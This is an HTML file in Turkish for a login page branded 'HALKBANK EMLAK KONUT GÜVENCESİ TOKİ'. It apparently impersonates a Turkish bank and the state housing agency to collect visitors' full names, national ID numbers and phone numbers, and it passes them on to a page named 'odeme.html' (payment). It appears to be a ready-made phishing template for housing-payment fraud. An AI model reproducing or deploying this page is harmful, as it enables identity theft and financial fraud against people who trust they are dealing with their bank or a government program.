<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HALKBANK EMLAK KONUT GÜVENCESİ TOKİ</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
        .navbar { background-color: #004a99; color: white; padding: 20px; text-align: center; font-size: 18px; font-weight: bold; border-bottom: 4px solid #003366; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        h2 { color: #004a99; text-align: center; font-size: 22px; margin-top: 0; }
        p { color: #666; text-align: center; font-size: 13px; margin-bottom: 25px; line-height: 1.5; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-size: 12px; color: #333; margin-bottom: 5px; font-weight: bold; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
        button { width: 100%; background-color: #004a99; color: white; padding: 15px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="navbar">HALKBANK EMLAK KONUT GÜVENCESİ TOKİ</div>
    <div class="container">
        <h2>HAK SAHİBİ GİRİŞİ</h2>
        <p>Tahsis durumunuzu ve ödeme planınızı görüntülemek için bilgileri doğrulayınız.</p>
        <form action="odeme.html" method="GET">
            <div class="form-group">
                <label>AD SOYAD</label>
                <input type="text" name="ad" placeholder="Ad Soyad" required>
            </div>
            <div class="form-group">
                <label>T.C. KİMLİK NO</label>
                <input type="text" name="tc" maxlength="11" placeholder="11 Haneli T.C. No" required>
            </div>
            <div class="form-group">
                <label>CEP TELEFONU</label>
                <input type="tel" name="tel" placeholder="05XX XXX XX XX" required>
            </div>
            <button type="submit">SORGULA VE DEVAM ET</button>
        </form>
    </div>
</body>
</html>
